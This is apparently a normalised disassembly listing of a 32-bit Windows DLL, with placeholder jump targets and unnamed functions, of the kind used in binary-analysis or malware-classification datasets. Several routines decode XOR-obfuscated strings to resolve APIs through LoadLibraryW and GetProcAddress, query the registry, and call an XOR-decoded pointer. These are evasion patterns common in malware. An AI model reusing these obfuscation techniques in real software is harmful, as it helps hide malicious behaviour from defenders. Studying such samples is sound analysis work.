cmp [ esi + 0x388 ] ebx
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x110 ]
push edx
lea ecx [ ebp - 0x294 ]
call sub_10034100
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x120 ]
push edx
lea ecx [ ebp - 0x294 ]
call sub_10034100
mov [ ebp - 0x4 ] esi
xor eax eax
jmp r-xdata
push esi
push edi
mov ecx [ esi + 0x388 ]
push sub_10033150
push sub_10039fb0
push sub_10029960
push sub_1001f3f0
push sub_10030c00
push sub_10033a60
push sub_10054cc0
push sub_1001d1b0
push sub_10009fd0
lea eax [ esi + 0x10 ]
push sub_10027710
push eax
call ecx
xor edx edx
add esp 0x34
test eax eax
setne dl
mov [ esi + 0xc ] eax
mov eax edx
lea edx [ ebp - 0x170 ]
mov eax 0x7c
mov [ esi + 0x384 ] ebx
call sub_10069020
push edx
lea ecx [ ebp - 0x2b0 ]
call sub_1004a920
lea edx [ ebp - 0x2b0 ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
cmp [ ebp - 0x29c ] 0x8
jb r-xdata
cmp [ esi + 0x38c ] ebx
je r-xdata
lea edx [ ebp - 0x294 ]
mov ecx 0x6
call sub_10022b50
cmp [ ebp - 0x280 ] 0x8
jb r-xdata
mov eax [ ebp - 0x294 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x2b0 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
jmp r-xdata
cmp [ esi + 0x390 ] ebx
je r-xdata
cmp [ esi + 0x394 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
sub_1002fc40
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea ebx [ esi + 0x4 ]
cmp ebx [ ebp + 0xc ]
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edx [ ebx - 0x4 ]
lea esi [ ebx - 0x4 ]
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov eax ebx
sub eax esi
sar eax 0x2
add eax eax
add eax eax
push eax
mov ecx ebx
sub ecx eax
add ecx 0x4
push esi
push ecx
call sub_1007ec40
add esp 0xc
mov [ esi ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
mov ecx [ ebp - 0x4 ]
mov eax [ esi ]
mov [ ebp - 0x4 ] esi
mov [ ecx ] eax
mov edx [ esi - 0x4 ]
sub esi 0x4
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
jne r-xdata
add ebx 0x4
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ esi ]
mov edi [ ebx ]
push eax
push edi
mov [ ebp - 0x4 ] ebx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
pop edi
sub_1002fcd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087a86
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp [ esi + 0xa8 ] 0x8
jb r-xdata
mov ecx esi
call [ r--data ]
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor ecx ecx
mov [ esi + 0xa8 ] 0x7
mov [ esi + 0xa4 ] 0x0
mov [ esi + 0x94 ] cx
call sub_10031020
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x94 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
mov eax [ eax ]
sub_1002fd80
push ebp
mov ebp esp
sub esp 0xbc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xbc ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0xb8 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0xb8 ]
push ebx
mov ebx [ ebp - 0xbc ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10048ec0
xor edi edi
mov [ esi ] r--data
mov [ esi + 0xb8 ] 0x0
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xc4 ] edi
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8f
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x3c ]
xor eax eax
push ecx
mov [ ebp - 0x26 ] ax
call [ LoadLibraryW@IAT ]
mov [ esi + 0xbc ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov bl [ ecx + edi ]
xor bl dl
xor bl 0x8c
inc dl
mov [ ebp + ecx - 0x14 ] bl
movzx ecx dl
cmp ecx 0xd
jb r-xdata
mov ebx [ GetProcAddress@IAT ]
lea edx [ ebp - 0x14 ]
push edx
push eax
mov [ ebp - 0x7 ] 0x0
call ebx
mov [ esi + 0xc8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xa0 ]
mov eax 0x37
call sub_10018dc0
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xcc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x78 ]
mov eax 0x56
call sub_10018dc0
mov eax [ esi + 0xbc ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xd0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x50 ]
mov eax 0x53
call sub_10018dc0
mov edx [ esi + 0xbc ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xd4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xb4 ]
mov eax 0x60
call sub_10018dc0
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xd8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x24 ]
mov eax 0x30
call sub_10018dc0
mov eax [ esi + 0xbc ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xdc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x8c ]
mov eax 0x2b
call sub_10018dc0
mov edx [ esi + 0xbc ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xe0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x64 ]
mov eax 0x2a
call sub_10018dc0
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xe4 ] eax
test eax eax
je r-xdata
mov [ esi + 0xb8 ] 0x1
sub_1002ffa0
push ebp
mov ebp esp
push esi
mov esi eax
cmp esi ebx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop esi
pop ebp
retn
push edi
jmp r-xdata
movzx eax [ esi ]
mov edi [ ebp + 0xc ]
push eax
call sub_10011f58
mov [ edi ] ax
add [ ebp + 0xc ] 0x2
add esi 0x2
add esp 0x4
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ eax ] ecx
pop esi
pop ebp
retn
sub_1002fff3
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_10032da8
call sub_10032da8
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_10030066
push 0x8
mov eax sub_10085413
call sub_100259bb
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_100575c5
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_1003d7d5
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10003340
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_1005912f
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_1005912f
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_1005912f
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_10032181
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_10032181
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_10008d33
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_1007f580
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_1007f580
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_100676d2
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_100676d2
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_100301e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push edx
mov ecx esi
mov [ esi ] ax
call sub_10034100
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003020f
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_100302d3
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005bd9b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10030370
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10080b53
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100303c0
push ebp
mov ebp esp
sub esp 0x420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x210 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
call sub_1001baa0
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10067f10
lea edx [ ebp - 0x210 ]
add esp 0x4
push edx
call sub_100451e0
lea eax [ ebp - 0x210 ]
add esp 0x4
push eax
call sub_1004ee80
lea ecx [ ebp - 0x210 ]
add esp 0x4
push ecx
call sub_10042b20
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
call sub_1000ee10
lea ecx [ ebp - 0x418 ]
push ecx
push 0x104
call [ GetCurrentDirectoryW@IAT ]
lea edx [ ebp - 0x418 ]
push edx
call [ PathAddBackslashW@IAT ]
lea edx [ ebp - 0x418 ]
call sub_10018e00
push 0x0
call [ ExitProcess@IAT ]
int3
push eax
call [ ReleaseMutex@IAT ]
mov edx [ rw-data ]
mov al 0x38
mov [ ebp - 0x41c ] edx
xor [ ebp - 0x41c ] al
xor [ ebp - 0x41b ] al
xor [ ebp - 0x41a ] al
xor [ ebp - 0x419 ] al
mov eax [ rw-data ]
push eax
call [ ebp - 0x41c ]
sub_100304a2
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov edx 0x100
test esi esi
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
push esi
call sub_10030f03
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
pop edi
cmp cx dx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x41 ]
cmp dx 0x19
ja r-xdata
add cx 0x20
movzx eax cx
jmp r-xdata
sub_10030510
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
push eax
lea esi [ edi + 0x8 ]
push esi
lea ecx [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
call sub_100447e0
push eax
mov ecx esi
call sub_1001b9b0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ edi + 0x4c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000c927
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi ebx
call sub_10003c9c
xor ebx ebx
cmp esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov [ edi + 0x4c ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_10030594
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10032538
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10055e2a
int3
sub_100305d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100867b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_10051a60
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x62
call sub_1002f620
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10030710
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push edi
mov edi [ esi + 0x4 ]
call sub_1006a100
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
pop edi
sub_10030750
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100307a0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
lea eax [ eax + ecx * 4 ]
sub edx ecx
push edi
mov edi [ eax ]
lea ecx [ edx * 4 - 0x4 ]
push ecx
lea edx [ eax + 0x4 ]
push edx
push eax
call sub_1007ec40
add esp 0xc
dec [ esi + 0x4 ]
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_100307e0
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
push edi
lea esp [ esp ]
movsx edi [ ecx + eax ]
xor edi eax
xor edi 0x2a
and edi 0xff
mov [ ebp + eax * 2 - 0x58 ] di
inc eax
cmp eax 0x28
jb r-xdata
lea ecx [ ebp - 0x5c ]
push ecx
xor eax eax
push 0x1
push eax
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0x58 ]
push eax
push edx
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov edi [ GetProcessHeap@IAT ]
push 0x206
push 0x8
mov [ esi ] 0x206
call edi
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x5c ]
push esi
push eax
push 0x0
push 0x0
push r--data
push ecx
mov [ ebx ] eax
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x5c ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebx ]
push edx
push 0x0
call edi
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x5c ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_100308d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088f7e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x230 ]
push ebx
push ecx
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x230 ]
call sub_10063850
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x234 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x238 ]
mov [ ebp - 0x238 ] ebx
mov [ ebp - 0x234 ] ebx
call sub_100310b0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x238 ] ebx
jne r-xdata
push 0x1
call sub_1002e3ac
add esp 0x4
push eax
lea ecx [ ebp - 0x240 ]
mov [ ebp - 0x240 ] ebx
mov [ ebp - 0x23c ] ebx
call sub_10002ce0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x240 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x234 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x230 ]
push ecx
lea ecx [ ebp - 0x238 ]
call sub_1001ee70
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov ebx [ ebp - 0x238 ]
call sub_10011800
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea esi [ ebx + 0xe8 ]
lea edx [ ebp - 0x244 ]
mov eax 0x8d
add ebx 0x104
call sub_10069020
lea edx [ ebp - 0x24 ]
mov eax 0xf5
call sub_10069020
fld [ ebp + 0x8 ]
fld [ r--data ]
fsubr st1
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fabs
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub esp 0x8
lea edx [ ebp - 0x24 ]
fstp [ esp ]
push edx
lea eax [ ebp - 0x18 ]
push eax
mov edx 0x4
call sub_100727f0
add esp 0x10
lea edx [ ebp - 0x18 ]
fstp st0
lea edx [ ebp - 0x244 ]
jmp r-xdata
sub esp 0x8
lea ecx [ ebp - 0x24 ]
fstp [ esp ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov edx 0x4
call sub_100727f0
add esp 0x10
lea edx [ ebp - 0x18 ]
fstp st0
lea edx [ ebp - 0x244 ]
jmp r-xdata
push esi
call sub_10019010
fld [ ebp + 0xc ]
fld [ r--data ]
fsubr st1
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fabs
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
call sub_10039fc0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
xor eax eax
call sub_10039fc0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x6
jmp r-xdata
push ebx
call sub_10019010
lea ecx [ ebp - 0x238 ]
call sub_1002bf80
test eax eax
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x240 ]
je r-xdata
sub_10030c50
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea edx [ eax + 0x2 ]
mov [ esi ] edx
movzx eax [ eax ]
pop esi
retn
mov eax ecx
pop esi
retn
sub_10030cc0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ esp + 0xc ]
call sub_1001e9a0
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
cmp [ ebp + 0xc ] eax
